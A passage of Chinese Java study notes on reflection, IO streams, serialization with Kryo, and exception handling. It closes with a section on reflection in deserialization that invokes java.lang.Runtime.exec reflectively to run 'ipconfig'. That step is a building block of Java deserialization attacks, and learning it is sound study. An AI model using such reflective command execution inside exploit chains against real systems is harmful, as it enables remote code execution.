<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 委派对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Delegator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Delegate delegate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doTask</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 在运行时根据条件选择委派对象</span></span><br><span class="line">        <span class="keyword">if</span> (someCondition) &#123;</span><br><span class="line">            delegate = <span class="keyword">new</span> <span class="title class_">ConcreteDelegateA</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            delegate = <span class="keyword">new</span> <span class="title class_">ConcreteDelegateB</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        delegate.doTask();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>动态实现允许你根据不同的条件或情况选择不同的实现对象，因此更加灵活。本地实现通常在编译时确定委派关系，因此更加静态和固定。你可以根据具体的需求选择使用哪种实现方式。</p></li>
<li><p>Java反射demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">privateMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;私有方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span><br><span class="line">            IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">// 获取 Person 类的 Class 对象</span></span><br><span class="line">        Class&lt;?&gt; personClass = Class.forName(<span class="string">&quot;com.github.paicoding.forum.test.javabetter.importance.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取并打印类名</span></span><br><span class="line">        System.out.println(<span class="string">&quot;类名: &quot;</span> + personClass.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取构造函数</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = personClass.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用构造函数创建 Person 对象实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">personInstance</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;沉默王二&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取并调用 getName 方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getNameMethod</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) getNameMethod.invoke(personInstance);</span><br><span class="line">        System.out.println(<span class="string">&quot;名字: &quot;</span> + name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取并调用 setAge 方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setAgeMethod</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;setAge&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        setAgeMethod.invoke(personInstance, <span class="number">35</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取并访问 age 字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        ageField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> ageField.getInt(personInstance);</span><br><span class="line">        System.out.println(<span class="string">&quot;年纪: &quot;</span> + age);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取并调用私有方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">privateMethod</span> <span class="operator">=</span> personClass.getDeclaredMethod(<span class="string">&quot;privateMethod&quot;</span>);</span><br><span class="line">        privateMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        privateMethod.invoke(personInstance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="java-io">Java IO</h3>
<ol type="1">
<li><p><code>流（Stream</code>），是一个抽象的概念，是指一连串的数据（<code>字符</code>或<code>字节</code>），是以先进先出的方式发送信息的通道。</p>
<p>当程序需要读取数据的时候，就会开启一个<code>通向数据源</code>的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个<code>通向目的地</code>的流。这时候你就可以想象数据好像在这其中“流”动一样。</p>
<ol type="1">
<li>先进先出</li>
<li>顺序存取</li>
<li>只读或只写</li>
</ol></li>
<li><p>具体还要看<code>字符编码</code>，比如说在 UTF-8
编码下，一个英文字母（不分大小写）为一个字节，一个中文汉字为<strong>三个</strong>字节；在
Unicode
编码中，一个英文字母为一个字节，一个中文汉字为<strong>两个</strong>字节。</p></li>
<li><p>字节流用来处理<strong>二进制文件</strong>，比如说图片啊、MP3
啊、视频啊。</p>
<p>字符流用来处理<strong>文本文件</strong>，文本文件可以看作是一种特殊的二进制文件，只不过经过了编码，便于人们阅读。</p>
<p>换句话说：<strong>字节流可以处理一切文件，而字符流只能处理文本</strong></p></li>
<li><p><strong>核心</strong>的就是 4
个抽象类：<code>InputStream</code>、<code>OutputStream</code>、<code>Reader</code>、<code>Writer</code></p></li>
<li><p>核心IO方法：<code>read</code> 和 <code>write</code></p></li>
<li><p>字节流本身没有<code>缓冲区</code>，缓冲字节流相对于字节流，<code>效率</code>提升非常高。而<code>字符流</code>本身就带有缓冲区，缓冲字符流相对于字符流效率提升就不是那么大了</p></li>
<li><p><code>Input</code>：将外部的数据读入<code>内存</code>，比如说把文件从<code>硬盘</code>读取到内存，从<code>网络</code>读取数据到内存等等</p>
<p><code>Output</code>：将内存中的数据写入到外部，比如说把数据从内存写入到文件，把数据从内存输出到网络</p></li>
<li><p>按照 IO 的操作对象来思考，IO
就可以<strong>分类</strong>为：文件、数组、管道、基本数据类型、缓冲、打印、对象序列化/反序列化，以及转换等。</p></li>
<li><p>Java 中的管道和 <code>Unix/Linu</code>x
中的<code>管道</code>不同，在 Unix/Linux
中，<strong>不同的进程</strong>之间可以通过管道来通信，但 Java
中，通信的双方必须在<strong>同一个 JVM</strong>
中，管道为线程之间的通信提供了通信能力。</p></li>
<li><p><code>基本数据类型输入输出流</code>是一个字节流，该流不仅可以读写字节和字符，还可以读写基本数据类型。</p></li>
<li><p>了减少程序和硬盘的交互，提升程序的效率，就引入了<code>缓冲流</code>，也就是类名前缀带有
<code>Buffer</code> 的那些，比如说
BufferedInputStream、BufferedOutputStream、BufferedReader、BufferedWriter</p></li>
<li><p><code>打印</code>：PrintStream
最终输出的是<code>字节数据</code>，而 PrintWriter 则是扩展了 Writer
接口，所以它的 <code>print()/println()</code>
方法最终输出的是字符数据。使用上几乎和 PrintStream 一模一样。</p></li>
<li><p><code>序列化</code>本质上是将一个 Java
对象转成字节数组，然后可以将其保存到文件中，或者通过网络传输到远程。</p></li>
<li><p>InputStreamReader
是从<code>字节流到字符流</code>的桥连接，它使用<code>指定的字符</code>集读取字节并将它们解码为字符</p>
<p>OutputStreamWriter
将一个字符流的输出对象变为字节流的输出对象，是<code>字符流通向字节流</code>的桥梁。</p></li>
</ol>
<h4 id="序列流">序列流</h4>
<ol type="1">
<li><p>在 Java 中，序列化通过实现 java.io.Serializable
接口来实现，<strong>只有</strong>实现了 <code>Serializable</code>
接口的对象才能被序列化。</p></li>
<li><p><code>java.io.ObjectOutputStream</code> 继承自 OutputStream
类，因此可以将序列化后的字节序列写入到文件、网络等输出流中。</p>
<p>ObjectOutputStream 的构造方法：
<code>ObjectOutputStream(OutputStream out)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br></pre></td></tr></table></figure></li>
<li><p>一个对象要想序列化，必须满足<strong>两个条件</strong>:</p>
<p>该类必须实现<code>java.io.Serializable</code>
接口，否则会抛出<code>NotSerializableException</code> 。
该类的所有字段都必须是可序列化的。如果一个字段不需要序列化，则需要使用<code>transient</code>
关键字进行修饰。</p></li>
<li><p><code>writeObject (Object obj)</code> 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">objectOutputStreamDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// serialization</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;xx&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/person.dat&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialization</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;logs/person.dat&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">            <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) obj;</span><br><span class="line">            System.out.println(<span class="string">&quot;Deserialized Object:&quot;</span> + p);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/EsotericSoftware/kryo">Kryo</a></p>
<ol type="1">
<li><p>实际开发中，很少使用 <strong>JDK
自带</strong>的序列化和反序列化</p></li>
<li><p>使用</p>
<ol type="1">
<li><p>在 <code>pom.xml</code> 中引入依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 引入 Kryo 序列化工具 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;5.4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>第二步，创建一个 Kryo 对象，并使用 <code>register()</code>
方法将对象进行注册。然后，使用 <code>writeObject()</code> 方法将 Java
对象序列化为二进制流，再使用 <code>readObject()</code>
方法将二进制流反序列化为 Java 对象。最后，输出反序列化后的 Java
对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KryoDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(KryoParam.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">KryoParam</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">KryoParam</span>(<span class="string">&quot;沉默王二&quot;</span>, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/kryo.bin&quot;</span>));</span><br><span class="line">        kryo.writeObject(output, object);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;logs/kryo.bin&quot;</span>));</span><br><span class="line">        <span class="type">KryoParam</span> <span class="variable">object2</span> <span class="operator">=</span> kryo.readObject(input, KryoParam.class);</span><br><span class="line">        System.out.println(object2);</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KryoParam</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">KryoParam</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">KryoParam</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KryoParam&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol></li>
</ol></li>
</ol>
<h4 id="java-serializable-接口">Java Serializable 接口</h4>
<ol type="1">
<li>Java 序列化是 JDK 1.1 时引入的一组开创性的特性，用于将 Java
对象转换为<code>字节数组</code>，便于<code>存储</code>或<code>传输</code>。此后，仍然可以将字节数组转换回
Java 对象原有的状态</li>
<li><code>NotSerializableException</code> 异常</li>
<li><code>Serializable</code>
接口之所以定义为空，是因为它只起到了一个标识的作用，告诉程序实现了它的对象是可以被序列化的，但真正序列化和反序列化的操作并不需要它来完成</li>
<li><code>static</code> 和 <code>transient</code>
修饰的字段是不会被序列化的</li>
<li>序列化保存的是<code>对象</code>的状态，而 static
修饰的字段属于<code>类</code>的状态，因此可以证明序列化并不保存
<code>static</code> 修饰的字段。</li>
<li><code>transient</code>
的中文字义为“临时的”），它可以<strong>阻止</strong>字段被序列化到文件中，在被反序列化后，<code>transient</code>
字段的值被设为初始值，比如 <code>int</code> 型的初始值为
0，对象型的初始值为 <code>null</code>。</li>
<li><code>Externalizable</code> 和 Serializable 都是用于实现 Java
对象的序列化和反序列化的接口，但是它们有以下区别：
<ol type="1">
<li>Serializable 是 Java 标准库提供的接口，而 Externalizable 是
Serializable 的<code>子接口</code></li>
<li>Serializable
接口<strong>不需要</strong>实现任何方法，只需要将需要序列化的类<code>标记</code>为
Serializable 即可，而 Externalizable 接口需要实现 writeExternal 和
readExternal 两个方法</li>
<li>Externalizable
接口提供了更高的<code>序列化控制</code>能力，可以在序列化和反序列化过程中对对象进行<code>自定义</code>的处理，如对一些敏感信息进行加密和解密。</li>
</ol></li>
<li><code>serialVersionUID</code> 被称为序列化
ID，它是<strong>决定</strong> Java
对象能否反序列化成功的重要因子。在反序列化时，Java 虚拟机会把字节流中的
serialVersionUID 与被序列化类中的 <code>serialVersionUID</code>
进行比较，如果相同则可以进行反序列化，否则就会抛出序列化版本不一致的异常</li>
<li>Java
虚拟机是否允许反序列化，<strong>不仅</strong>取决于类路径和功能代码是否一致，还有一个非常重要的因素就是<code>序列化 ID</code>
是否一致。</li>
<li>如果实现的是 <code>Externalizable</code> 接口，则需要在
writeExternal 方法中<strong>指定</strong>要序列化的字段，与 transient
关键字修饰无关</li>
</ol>
<h4 id="打印流">打印流</h4>
<ol type="1">
<li><code>PrintStream</code> 是 OutputStream 的子类</li>
<li>PrintStream 类的常用方法包括：
<ul>
<li><code>print()</code>：输出一个对象的字符串表示形式。</li>
<li><code>println()</code>：输出一个对象的字符串表示形式，并在末尾添加一个<code>换行符</code>。</li>
<li><code>printf()</code>：使用指定的<code>格式</code>字符串和参数输出格式化的字符串</li>
</ul></li>
</ol>
<h3 id="java-异常处理">Java 异常处理</h3>
<h4 id="全面解析">全面解析</h4>
<ol type="1">
<li><p>有了异常处理机制后，程序在发生异常的时候就不会<code>中断</code>，我们可以对异常进行<strong>捕获</strong>，然后改变程序执行的流程。</p>
<p>除此之外，异常处理机制可以保证我们向<strong>用户</strong>提供友好的提示信息，而不是程序原生的异常信息——用户根本理解不了。</p>
<p>不过，站在<strong>开发者</strong>的角度，我们更希望看到原生的异常信息，因为这有助于我们更快地找到
bug 的根源，反而被过度包装的异常信息会干扰我们的视线。</p></li>
<li><p><code>Error</code>
的出现，意味着程序出现了<strong>严重</strong>的问题，而这些问题不应该再交给
Java 的异常处理机制来处理，程序应该直接崩溃掉，比如说
<code>OutOfMemoryError</code>，内存溢出了，这就意味着程序在运行时申请的内存大于系统能够提供的内存，导致出现的错误，这种错误的出现，对于程序来说是致命的。</p>
<p><code>Exception</code>
的出现，意味着程序出现了一些在<strong>可控范围</strong>内的问题，我们应当采取措施进行挽救</p></li>
<li><p><code>NoClassDefFoundError</code>：程序在<code>编译时</code>可以找到所依赖的类，但是在<code>运行时</code>找不到指定的类文件，导致抛出该错误；原因可能是
jar 包缺失或者调用了初始化失败的类。</p></li>
<li><p><code>ClassNotFoundException</code>：当<code>动态加载</code>
Class
对象的时候找不到对应的类时抛出该异常；原因可能是要加载的类不存在或者类名写错了</p></li>
<li><p><code>unchecked</code> 异常可以不在程序中显示处理，就像之前提到的
ArithmeticException 就是的；但 <code>checked</code>
异常必须<code>显式处理</code>。</p></li>
<li><p><code>throw</code>
关键字，用于<strong>主动</strong>地抛出异常；正常情况下，当除数为 0
的时候，程序会主动抛出 ArithmeticException；但如果我们想要除数为 1
的时候也抛出 ArithmeticException，就可以使用 throw
关键字主动地抛出异常</p></li>
<li><p><code>Class.forName()</code> 方法在执行的时候可能会遇到
<code>java.lang.ClassNotFoundException</code>
异常，一个检查型异常，如果没有做处理，IDEA
就会提示你，要么在方法签名上声明，要么放在 try-catch 中</p></li>
<li><p>什么情况下使用 throws 而不是 try-catch 呢</p>
<ol type="1">
<li><p>但假设有好几个类似 <code>myMethod()</code>
的方法，如果为每个方法都加上 try-catch，就会显得非常繁琐</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        myMethod1();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123;</span><br><span class="line">        <span class="comment">// 算术异常</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">        <span class="comment">// 空指针异常</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">myMethod1</span><span class="params">()</span> <span class="keyword">throws</span> ArithmeticException, NullPointerException&#123;</span><br><span class="line">    <span class="comment">// 方法签名上声明异常</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>throws 关键字用于<code>声明异常</code>，它的作用和 try-catch
相似；而 throw 关键字用于显式的抛出异常。</p>
<p>throws 关键字后面跟的是异常的<strong>名字</strong>；而 throw
关键字后面跟的是异常的<strong>对象</strong></p>
<p>throws 关键字出现在方法签名上，而 throw 关键字出现在方法体里。</p>
<p>throws 关键字在声明异常的时候可以跟多个，用逗号隔开；而 throw
关键字每次只能抛出一个异常。</p></li>
</ol></li>
<li><p>一个 <code>try</code> 块后面可以跟多个 <code>catch</code>
块，用来捕获不同类型的异常并做相应的处理，当 try
块中的某一行代码发生异常时，之后的代码就<strong>不再执行</strong>，而是会跳转到异常对应的
catch 块中执行。</p>
<p>如果一个 try 块后面跟了多个与之关联的 catch
块，那么应该把<strong>特定的异常</strong>放在前面，通用型的异常放在后面，不然编译器会提示错误。</p></li>
<li><p>Checked Exception
通常是由于<strong>外部因素</strong>导致的问题，需要在代码中显式地处理或声明抛出。</p>
<p>Unchecked Exception
通常是由于<strong>程序内部逻辑或数据异常</strong>导致的，可以不处理或者在需要时进行处理。</p></li>
<li><p>虽然知道<code>try-catch</code>会有性能影响，但是业务上不需要避讳其使用，业务实现优先（只要不是书中举例的那种逆天代码就行），非特殊情况下性能都是其次，有意识地避免大范围的<code>try-catch</code>，只
catch 需要的部分即可（没把握全 catch 也行，代码安全执行第一）</p></li>
</ol>
<h4 id="深入理解-java-中的-try-with-resources">深入理解 Java 中的 try
with resources</h4>
<ol type="1">
<li><p>在处理必须关闭的资源时，始终有限考虑使用
<code>try-with-resources</code>，而不是 try–catch-finally</p></li>
<li><p>把要释放的资源写在 try 后的 <code>()</code>
中。如果有多个资源（BufferedReader 和
PrintWriter）需要释放的话，可以直接在 <code>()</code> 中添加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(decodePath));</span><br><span class="line">     <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(writePath))) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((str =br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        writer.print(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="反序列化中的反射1">反序列化中的反射(1)</h3>
<ol type="1">
<li><p>Java的<code>反射（reflection）机制</code>是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。反射被视为<code>动态语言</code>的关键</p></li>
<li><p>通俗的来说，就是我们可以通过Java的反射机制来获取到任意一个Class、变量、method、instance</p></li>
<li><p>动态语言可以改变一个变量的类型 -
你不用提前定义某个变量的类型，比如<code>Python</code>和<code>PHP</code>,这些语言会在运行时自动探针你的变量类型，而你也可以在代码中随时对这些变量类型进行改变。</p>
<p>而静态语言例如<code>Java</code>,<code>C/C++</code>,<code>C#</code>就不一样，我们必须事先指定变量类型是<code>String</code>,<code>int</code>,还是<code>double</code></p></li>
<li><p>都是获取class对象，与<code>.getClass()</code>不同的是,<code>.class</code>
是在编译期就被确定,而<code>.getClass()</code>是在运行时调用的</p></li>
</ol>
<h4
id="java.lang.runtime命令执行及访问private的方法">java.lang.Runtime命令执行及访问private的方法</h4>
<ol type="1">
<li><p>Code</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class的Class类</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> runTimeClass.newInstance();<span class="comment">//创建一个新的Runtime的实例</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//在实例中call exec()这个method</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>代码提示19行出错 - 我们不能访问<code>private</code>属性的成员</p>
